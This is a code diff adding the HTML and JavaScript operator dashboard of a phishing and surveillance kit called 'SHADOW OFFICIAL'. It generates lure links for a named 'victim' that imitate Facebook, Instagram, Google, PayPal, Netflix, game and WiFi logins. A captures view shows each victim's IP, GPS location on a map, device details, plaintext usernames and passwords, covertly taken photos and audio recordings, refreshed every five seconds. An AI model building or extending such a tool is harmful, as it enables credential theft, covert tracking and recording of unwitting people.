@@ -1,0 +1,432 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>SHADOW OFFICIAL | Admin Panel</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#0a0e1a;color:#e0e0e0;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;min-height:100vh;overflow-x:hidden}
+
+/* Background particles */
+.bg-particles{position:fixed;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:0;overflow:hidden}
+.bg-particles .dot{position:absolute;width:3px;height:3px;background:rgba(100,150,255,0.3);border-radius:50%;animation:float 15s infinite}
+@keyframes float{0%,100%{transform:translateY(0) translateX(0);opacity:0}50%{opacity:1}100%{transform:translateY(-100vh) translateX(50px);opacity:0}}
+
+/* Header */
+.top-bar{background:rgba(15,20,40,0.95);backdrop-filter:blur(20px);padding:15px 20px;display:flex;justify-content:space-between;align-items:center;border-bottom:1px solid rgba(100,100,255,0.1);position:sticky;top:0;z-index:100}
+.user-card{background:rgba(30,40,70,0.6);border-radius:16px;padding:12px 20px;display:flex;align-items:center;gap:12px;border:1px solid rgba(100,100,255,0.15);flex:1;max-width:300px}
+.user-avatar{width:45px;height:45px;background:linear-gradient(135deg,#ff3333,#cc0000);border-radius:12px;display:flex;align-items:center;justify-content:center;font-size:22px}
+.user-info h3{font-size:16px;color:#fff}
+.user-info span{font-size:12px;color:#888}
+.user-actions{display:flex;gap:10px}
+.user-actions button{width:40px;height:40px;border-radius:12px;border:none;background:rgba(100,100,255,0.15);color:#fff;cursor:pointer;font-size:18px;transition:all 0.3s}
+.user-actions button:hover{background:rgba(100,100,255,0.3)}
+
+/* Tabs */
+.tabs{display:flex;gap:10px;padding:15px 20px;position:sticky;top:72px;z-index:99;background:rgba(10,14,26,0.95);backdrop-filter:blur(20px)}
+.tab-btn{padding:10px 24px;border-radius:25px;border:none;background:rgba(30,40,70,0.5);color:#888;font-size:14px;font-weight:600;cursor:pointer;transition:all 0.3s;display:flex;align-items:center;gap:8px}
+.tab-btn.active{background:linear-gradient(135deg,#6366f1,#8b5cf6);color:#fff;box-shadow:0 4px 20px rgba(99,102,241,0.3)}
+.tab-btn:hover:not(.active){background:rgba(50,60,100,0.5);color:#ccc}
+
+/* Content */
+.content{padding:0 20px 30px;position:relative;z-index:1}
+.tab-content{display:none}
+.tab-content.active{display:block}
+
+/* Dashboard Stats */
+.stats-grid{display:grid;grid-template-columns:repeat(4,1fr);gap:12px;margin-bottom:20px}
+.stat-card{background:rgba(20,30,60,0.6);border-radius:16px;padding:16px;text-align:center;border:1px solid rgba(100,100,255,0.1);transition:all 0.3s}
+.stat-card:hover{border-color:rgba(100,100,255,0.3);transform:translateY(-2px)}
+.stat-card .num{font-size:28px;font-weight:700;color:#fff;margin-bottom:4px}
+.stat-card .label{font-size:11px;color:#888;text-transform:uppercase;letter-spacing:0.5px}
+.stat-card .icon{font-size:20px;margin-bottom:8px}
+
+/* Generate Button */
+.generate-btn{width:100%;padding:16px;background:linear-gradient(135deg,#6366f1,#8b5cf6);border:none;border-radius:16px;color:#fff;font-size:16px;font-weight:600;cursor:pointer;margin-bottom:20px;transition:all 0.3s;display:flex;align-items:center;justify-content:center;gap:10px;box-shadow:0 4px 20px rgba(99,102,241,0.3)}
+.generate-btn:hover{transform:translateY(-2px);box-shadow:0 8px 30px rgba(99,102,241,0.4)}
+
+/* Template Grid */
+.template-section{background:rgba(20,30,60,0.6);border-radius:20px;padding:20px;margin-bottom:20px;border:1px solid rgba(100,100,255,0.1)}
+.template-section h3{font-size:16px;margin-bottom:15px;color:#fff;display:flex;align-items:center;gap:8px}
+.template-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:12px}
+.template-item{background:rgba(30,40,70,0.5);border-radius:16px;padding:16px;text-align:center;cursor:pointer;transition:all 0.3s;border:2px solid transparent;position:relative;overflow:hidden}
+.template-item:hover{background:rgba(40,50,90,0.6)}
+.template-item.active{border-color:#6366f1;background:rgba(60,70,120,0.4);box-shadow:0 0 20px rgba(99,102,241,0.2)}
+.template-item .t-icon{font-size:32px;margin-bottom:8px;display:block}
+.template-item .t-name{font-size:12px;color:#ccc;font-weight:500}
+.template-item .t-badge{position:absolute;top:6px;right:6px;background:#ff4444;color:#fff;font-size:9px;padding:2px 6px;border-radius:10px;font-weight:700}
+
+/* Victim Input */
+.victim-row{display:flex;gap:10px;margin-bottom:20px}
+.victim-input{flex:1;padding:14px 20px;background:rgba(20,30,60,0.6);border:1px solid rgba(100,100,255,0.2);border-radius:16px;color:#fff;font-size:15px;outline:none;transition:all 0.3s}
+.victim-input:focus{border-color:#6366f1;box-shadow:0 0 15px rgba(99,102,241,0.2)}
+.victim-input::placeholder{color:#666}
+.go-btn{padding:14px 28px;background:linear-gradient(135deg,#6366f1,#8b5cf6);border:none;border-radius:16px;color:#fff;font-size:16px;font-weight:600;cursor:pointer;transition:all 0.3s}
+.go-btn:hover{transform:scale(1.05)}
+
+/* Link Result */
+.link-result{background:rgba(20,30,60,0.8);border-radius:16px;padding:16px;margin-bottom:20px;border:1px solid rgba(100,100,255,0.2);display:none}
+.link-result.show{display:block}
+.link-result .link-badge{display:inline-block;padding:4px 12px;background:rgba(99,102,241,0.2);color:#6366f1;border-radius:20px;font-size:12px;font-weight:600;margin-bottom:10px}
+.link-result .link-url{background:rgba(10,14,26,0.8);padding:12px;border-radius:12px;font-family:monospace;font-size:12px;color:#4fc3f7;word-break:break-all;margin-bottom:12px}
+.link-result .copy-btn{width:100%;padding:12px;background:#10b981;border:none;border-radius:12px;color:#fff;font-size:14px;font-weight:600;cursor:pointer;transition:all 0.3s;display:flex;align-items:center;justify-content:center;gap:8px}
+.link-result .copy-btn:hover{background:#059669}
+
+/* Captures */
+.search-bar{display:flex;gap:10px;margin-bottom:20px}
+.search-input{flex:1;padding:12px 20px;background:rgba(20,30,60,0.6);border:1px solid rgba(100,100,255,0.2);border-radius:16px;color:#fff;font-size:14px;outline:none}
+.search-btn{padding:12px 20px;background:rgba(99,102,241,0.2);border:none;border-radius:16px;color:#6366f1;cursor:pointer;font-size:16px}
+
+.capture-card{background:rgba(20,30,60,0.6);border-radius:20px;padding:16px;margin-bottom:16px;border:1px solid rgba(100,100,255,0.1);animation:slideIn 0.3s ease}
+@keyframes slideIn{from{opacity:0;transform:translateY(20px)}to{opacity:1;transform:translateY(0)}}
+
+.capture-badges{display:flex;gap:8px;flex-wrap:wrap;margin-bottom:12px}
+.capture-badges .badge{padding:4px 12px;border-radius:20px;font-size:11px;font-weight:600}
+.badge-purple{background:rgba(99,102,241,0.2);color:#818cf8}
+.badge-blue{background:rgba(59,130,246,0.2);color:#60a5fa}
+.badge-green{background:rgba(34,197,94,0.2);color:#4ade80}
+.badge-red{background:rgba(239,68,68,0.2);color:#f87171}
+.badge-orange{background:rgba(249,115,22,0.2);color:#fb923c}
+
+.capture-info{background:rgba(10,14,26,0.6);border-radius:12px;padding:12px;margin-bottom:12px}
+.capture-info .ip-row{display:flex;align-items:center;gap:10px;margin-bottom:8px;flex-wrap:wrap}
+.capture-info .ip{font-size:16px;font-weight:700;color:#fbbf24}
+.capture-info .location{font-size:13px;color:#aaa}
+.capture-info .isp{font-size:11px;color:#666}
+
+.map-btn{display:inline-flex;align-items:center;gap:6px;padding:8px 16px;background:#ef4444;border:none;border-radius:10px;color:#fff;font-size:13px;font-weight:600;cursor:pointer;transition:all 0.3s;text-decoration:none}
+.map-btn:hover{background:#dc2626;transform:translateY(-1px)}
+
+.device-info{background:rgba(10,14,26,0.6);border-radius:12px;padding:10px 12px;margin-bottom:12px;font-size:12px;color:#888}
+.device-info span{color:#60a5fa}
+
+.creds-box{background:rgba(10,14,26,0.6);border-radius:12px;padding:12px;margin-bottom:12px}
+.creds-box p{font-size:13px;color:#ccc;margin:4px 0}
+.creds-box .pass{color:#f87171;font-weight:600}
+
+.photos-row{display:flex;gap:8px;overflow-x:auto;padding-bottom:8px;margin-bottom:12px}
+.photos-row img{height:80px;width:80px;object-fit:cover;border-radius:10px;border:2px solid rgba(100,100,255,0.2);cursor:pointer;transition:all 0.3s;flex-shrink:0}
+.photos-row img:hover{border-color:#6366f1;transform:scale(1.05)}
+
+.audio-box{background:rgba(10,14,26,0.6);border-radius:12px;padding:10px}
+.audio-box audio{width:100%;height:36px}
+
+.empty-state{text-align:center;padding:60px 20px;color:#666}
+.empty-state h2{font-size:20px;margin-bottom:10px;color:#888}
+
+/* Modal */
+.modal{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.9);z-index:1000;justify-content:center;align-items:center;padding:20px}
+.modal img{max-width:100%;max-height:80vh;border-radius:16px;border:3px solid #6366f1}
+.modal .close{position:absolute;top:20px;right:20px;color:#fff;font-size:40px;cursor:pointer;width:50px;height:50px;background:rgba(255,255,255,0.1);border-radius:50%;display:flex;align-items:center;justify-content:center}
+
+@media(max-width:600px){
+    .stats-grid{grid-template-columns:repeat(2,1fr)}
+    .template-grid{grid-template-columns:repeat(3,1fr)}
+    .user-card{max-width:none}
+}
+</style>
+</head>
+<body>
+<div class="bg-particles" id="particles"></div>
+
+<div class="top-bar">
+    <div class="user-card">
+        <div class="user-avatar">&#128520;</div>
+        <div class="user-info">
+            <h3>Shadow</h3>
+            <span>User</span>
+        </div>
+    </div>
+    <div class="user-actions">
+        <button onclick="location.reload()">&#128260;</button>
+        <button onclick="window.location.href='/settings'">&#9881;</button>
+    </div>
+</div>
+
+<div class="tabs">
+    <button class="tab-btn active" onclick="switchTab('dashboard')">&#128202; Dashboard</button>
+    <button class="tab-btn" onclick="switchTab('generate')">&#128279; Generate</button>
+    <button class="tab-btn" onclick="switchTab('captures')">&#128247; Captures</button>
+</div>
+
+<div class="content">
+    <!-- DASHBOARD TAB -->
+    <div class="tab-content active" id="dashboard-tab">
+        <div class="stats-grid">
+            <div class="stat-card">
+                <div class="icon">&#128248;</div>
+                <div class="num" id="statPhotos">0</div>
+                <div class="label">Photos</div>
+            </div>
+            <div class="stat-card">
+                <div class="icon">&#128273;</div>
+                <div class="num" id="statCreds">0</div>
+                <div class="label">Creds</div>
+            </div>
+            <div class="stat-card">
+                <div class="icon">&#127908;</div>
+                <div class="num" id="statAudio">0</div>
+                <div class="label">Audio</div>
+            </div>
+            <div class="stat-card">
+                <div class="icon">&#128100;</div>
+                <div class="num" id="statTotal">0</div>
+                <div class="label">Total</div>
+            </div>
+            <div class="stat-card">
+                <div class="icon">&#128205;</div>
+                <div class="num" id="statGPS">0</div>
+                <div class="label">GPS</div>
+            </div>
+            <div class="stat-card">
+                <div class="icon">&#128101;</div>
+                <div class="num" id="statContacts">0</div>
+                <div class="label">Contacts</div>
+            </div>
+            <div class="stat-card">
+                <div class="icon">&#128246;</div>
+                <div class="num" id="statWiFi">0</div>
+                <div class="label">WiFi</div>
+            </div>
+            <div class="stat-card">
+                <div class="icon">&#128107;</div>
+                <div class="num" id="statUsers">0</div>
+                <div class="label">Users</div>
+            </div>
+        </div>
+        <button class="generate-btn" onclick="switchTab('generate')">&#128279; Generate New Link</button>
+    </div>
+
+    <!-- GENERATE TAB -->
+    <div class="tab-content" id="generate-tab">
+        <div class="template-section">
+            <h3>&#128104; Select Template</h3>
+            <div class="template-grid">
+                <div class="template-item active" data-template="gaming" onclick="selectTemplate(this)">
+                    <span class="t-icon">&#127918;</span>
+                    <span class="t-name">Gaming</span>
+                </div>
+                <div class="template-item" data-template="facebook" onclick="selectTemplate(this)">
+                    <span class="t-icon">&#128187;</span>
+                    <span class="t-name">Facebook</span>
+                </div>
+                <div class="template-item" data-template="instagram" onclick="selectTemplate(this)">
+                    <span class="t-icon">&#128247;</span>
+                    <span class="t-name">Instagram</span>
+                </div>
+                <div class="template-item" data-template="google" onclick="selectTemplate(this)">
+                    <span class="t-icon">&#128269;</span>
+                    <span class="t-name">Google</span>
+                </div>
+                <div class="template-item" data-template="pubg" onclick="selectTemplate(this)">
+                    <span class="t-icon">&#128299;</span>
+                    <span class="t-name">PUBG</span>
+                </div>
+                <div class="template-item" data-template="freefire" onclick="selectTemplate(this)">
+                    <span class="t-icon">&#128293;</span>
+                    <span class="t-name">Free</span>
+                </div>
+                <div class="template-item" data-template="tiktok" onclick="selectTemplate(this)">
+                    <span class="t-icon">&#127925;</span>
+                    <span class="t-name">TikTok</span>
+                </div>
+                <div class="template-item" data-template="netflix" onclick="selectTemplate(this)">
+                    <span class="t-icon">&#127909;</span>
+                    <span class="t-name">Netflix</span>
+                </div>
+                <div class="template-item" data-template="paypal" onclick="selectTemplate(this)">
+                    <span class="t-icon">&#128179;</span>
+                    <span class="t-name">PayPal</span>
+                </div>
+                <div class="template-item" data-template="snapchat" onclick="selectTemplate(this)">
+                    <span class="t-icon">&#128123;</span>
+                    <span class="t-name">Snapchat</span>
+                </div>
+                <div class="template-item" data-template="wifi" onclick="selectTemplate(this)">
+                    <span class="t-icon">&#128246;</span>
+                    <span class="t-name">WiFi</span>
+                </div>
+            </div>
+        </div>
+
+        <div class="victim-row">
+            <input type="text" class="victim-input" id="victimName" placeholder="Victim name">
+            <button class="go-btn" onclick="generateLink()">&#9889; Go</button>
+        </div>
+
+        <div class="link-result" id="linkResult">
+            <span class="link-badge" id="linkBadge">Netflix</span>
+            <div class="link-url" id="linkUrl"></div>
+            <button class="copy-btn" onclick="copyLink()">&#128203; Copy Link</button>
+        </div>
+    </div>
+
+    <!-- CAPTURES TAB -->
+    <div class="tab-content" id="captures-tab">
+        <div class="search-bar">
+            <input type="text" class="search-input" id="searchInput" placeholder="Search..." onkeyup="filterCaptures()">
+            <button class="search-btn">&#128269;</button>
+        </div>
+        <div id="capturesList"></div>
+    </div>
+</div>
+
+<div class="modal" id="imageModal" onclick="closeModal()">
+    <span class="close">&times;</span>
+    <img id="modalImg" src="">
+</div>
+
+<script>
+let selectedTemplate = 'gaming';
+let allCaptures = [];
+
+// Create particles
+function createParticles() {
+    const container = document.getElementById('particles');
+    for (let i = 0; i < 30; i++) {
+        const dot = document.createElement('div');
+        dot.className = 'dot';
+        dot.style.left = Math.random() * 100 + '%';
+        dot.style.top = Math.random() * 100 + '%';
+        dot.style.animationDelay = Math.random() * 15 + 's';
+        dot.style.animationDuration = (10 + Math.random() * 10) + 's';
+        container.appendChild(dot);
+    }
+}
+createParticles();
+
+function switchTab(tab) {
+    document.querySelectorAll('.tab-btn').forEach(t => t.classList.remove('active'));
+    document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
+
+    const btnMap = {dashboard:0, generate:1, captures:2};
+    document.querySelectorAll('.tab-btn')[btnMap[tab]].classList.add('active');
+    document.getElementById(tab + '-tab').classList.add('active');
+
+    if (tab === 'captures') loadCaptures();
+    if (tab === 'dashboard') updateStats();
+}
+
+function selectTemplate(el) {
+    document.querySelectorAll('.template-item').forEach(t => t.classList.remove('active'));
+    el.classList.add('active');
+    selectedTemplate = el.dataset.template;
+}
+
+function generateLink() {
+    const victim = document.getElementById('victimName').value.trim() || 'Shadow';
+    const baseUrl = window.location.origin;
+    const url = `${baseUrl}/earn?user=${encodeURIComponent(victim)}&target=${encodeURIComponent(victim)}&template=${selectedTemplate}`;
+
+    document.getElementById('linkBadge').textContent = selectedTemplate.toUpperCase();
+    document.getElementById('linkUrl').textContent = url;
+    document.getElementById('linkResult').classList.add('show');
+}
+
+function copyLink() {
+    const url = document.getElementById('linkUrl').textContent;
+    navigator.clipboard.writeText(url);
+    const btn = document.querySelector('.copy-btn');
+    btn.innerHTML = '&#9989; Copied!';
+    setTimeout(() => btn.innerHTML = '&#128203; Copy Link', 2000);
+}
+
+async function loadCaptures() {
+    try {
+        const resp = await fetch('/api/captures');
+        allCaptures = await resp.json();
+        filterCaptures();
+        updateStats();
+    } catch(e) { console.error(e); }
+}
+
+function updateStats() {
+    document.getElementById('statPhotos').textContent = allCaptures.reduce((a,c) => a + (c.photos?.length||0), 0);
+    document.getElementById('statCreds').textContent = allCaptures.filter(c => c.credentials?.username || c.credentials?.password).length;
+    document.getElementById('statAudio').textContent = allCaptures.filter(c => c.audio).length;
+    document.getElementById('statTotal').textContent = allCaptures.length;
+    document.getElementById('statGPS').textContent = allCaptures.filter(c => c.gps_location?.lat).length;
+    document.getElementById('statContacts').textContent = '0';
+    document.getElementById('statWiFi').textContent = '0';
+    document.getElementById('statUsers').textContent = allCaptures.length;
+}
+
+function filterCaptures() {
+    const search = document.getElementById('searchInput').value.toLowerCase();
+    let filtered = allCaptures.filter(c => {
+        return !search || 
+            (c.ip?.toLowerCase().includes(search)) ||
+            (c.token?.toLowerCase().includes(search)) ||
+            (c.location?.city?.toLowerCase().includes(search));
+    });
+    renderCaptures(filtered);
+}
+
+function renderCaptures(captures) {
+    const container = document.getElementById('capturesList');
+    if (!captures.length) {
+        container.innerHTML = `<div class="empty-state"><h2>No captures yet</h2><p>Generate a link and share it</p></div>`;
+        return;
+    }
+
+    container.innerHTML = captures.map(c => {
+        let mapLat = c.gps_location?.lat || (c.location?.lat && c.location.lat !== 0 ? c.location.lat : null);
+        let mapLon = c.gps_location?.lon || (c.location?.lon && c.location.lon !== 0 ? c.location.lon : null);
+
+        return `
+        <div class="capture-card">
+            <div class="capture-badges">
+                <span class="badge badge-purple">${c.token || 'Unknown'}</span>
+                <span class="badge badge-blue">${c.template}</span>
+                ${c.credentials?.username ? '<span class="badge badge-green">Creds</span>' : ''}
+                ${c.audio ? '<span class="badge badge-orange">Audio</span>' : ''}
+                ${mapLat ? '<span class="badge badge-red">Maps</span>' : ''}
+            </div>
+            <div class="capture-info">
+                <div class="ip-row">
+                    <span class="ip">&#127760; ${c.ip}</span>
+                </div>
+                <div class="location">&#128205; ${c.location?.city || 'Unknown'}, ${c.location?.country || 'Unknown'}</div>
+                <div class="isp">ISP: ${c.location?.isp || 'Unknown'}</div>
+                ${mapLat ? `<a href="https://www.google.com/maps?q=${mapLat},${mapLon}" target="_blank" class="map-btn">&#128205; View on Google Maps</a>` : ''}
+            </div>
+            <div class="device-info">
+                &#128241; ${c.device?.platform || 'Unknown'} | ${c.device?.browser || 'Unknown'} | RAM:${c.device?.memory || '?'}GB | CPU:${c.device?.cores || '?'}cores
+            </div>
+            ${c.credentials?.username ? `
+            <div class="creds-box">
+                <p>&#128100; ${c.credentials.username}</p>
+                <p>&#128274; <span class="pass">${c.credentials.password || ''}</span></p>
+            </div>` : ''}
+            ${c.photos?.length ? `
+            <div class="photos-row">
+                ${c.photos.map(p => `<img src="${p}" onclick="openModal('${p}')">`).join('')}
+            </div>` : ''}
+            ${c.audio ? `
+            <div class="audio-box">
+                <audio controls src="${c.audio}"></audio>
+            </div>` : ''}
+        </div>`;
+    }).join('');
+}
+
+function openModal(src) {
+    document.getElementById('modalImg').src = src;
+    document.getElementById('imageModal').style.display = 'flex';
+}
+function closeModal() {
+    document.getElementById('imageModal').style.display = 'none';
+}
+
+// Auto refresh
+setInterval(() => {
+    if (document.getElementById('captures-tab').classList.contains('active')) {
+        loadCaptures();
+    }
+}, 5000);
+
+loadCaptures();
+</script>
+</body>
+</html>
